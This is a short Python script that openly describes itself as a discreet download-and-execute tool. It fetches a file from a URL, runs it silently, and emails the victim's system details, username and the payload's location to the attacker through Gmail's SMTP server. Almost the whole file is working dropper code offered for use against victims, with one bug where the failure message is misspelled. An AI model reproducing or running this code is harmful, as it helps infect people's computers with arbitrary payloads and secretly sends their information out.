"""download_execute.py

Author: Sam Hilliard

Downloads a specified file, then executes it.
Plain and simple.
Does so as discreetly as possible.
It also supports the functionality to report the victim's
system information and information of success back to the hacker via email.
"""

import os, subprocess, platform, getpass
import requests, smtplib

class DeliverPayload:

    def __init__(self, url, email, password, payload_name, path):
        self.url = url
        self.email = email
        self.password = password
        self.payload_name = payload_name
        self.path = path

    # downloads the file into a specified directory
    def download_file(self):
        r = requests.get(self.url)
        open(self.path, 'wb').write(r.content)

        return os.path.exists(self.path)

    def execute(self):
        subprocess.Popen(self.path)

    # sends an email from yourself to yourself notifying you that
    # the payload had been successfully downloaded and run
    # also reports system information of the victim computer
    def report(self, success_status):
        success_massage = 'The payload failed to download.'
        if success_status:
            success_message = 'The payload downloaded successfully.'

        message = """\
            Subject: Download and Execute payload run.

            Deliver Payload program executed on {system_info}.
            {success_message}
            
            Executed payload: {payload_name}
            Payload location: {payload_path}
            Current User: {user}
        """.format(payload_name=self.payload_name, payload_path=self.path, system_info=platform.platform(), 
                    user=getpass.getuser(), success_message=success_message)

        self.send_email(message)

    # sends an email from your own email to yourself
    # used in reporting step
    def send_email(self, message):
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(self.email, self.password)
        server.sendmail(self.email, self.email, message)
        server.quit()